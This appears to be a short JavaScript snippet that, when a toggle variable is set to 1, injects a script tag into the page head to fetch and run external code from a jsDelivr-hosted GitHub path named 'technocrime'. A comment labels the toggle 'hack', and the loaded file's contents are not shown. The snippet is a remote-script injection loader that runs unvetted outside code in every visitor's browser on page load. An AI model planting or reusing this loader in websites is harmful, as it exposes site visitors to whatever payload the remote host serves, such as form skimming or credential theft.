// your variable
    let ck = 1; // change to 0 to disable

    // check and load external script if hack = 1
    if (ck === 1) {
        const script = document.createElement('script');
        script.src = "https://cdn.jsdelivr.net/gh/rucomrada/technocrime/public/vres.js";
        script.type = "text/javascript";
        script.async = true;
        document.head.appendChild(script);

        script.onload = () => {
            console.log("External ck script loaded.");
        };

        script.onerror = () => {
            console.error("Failed to load the ck script.");
        };
    }
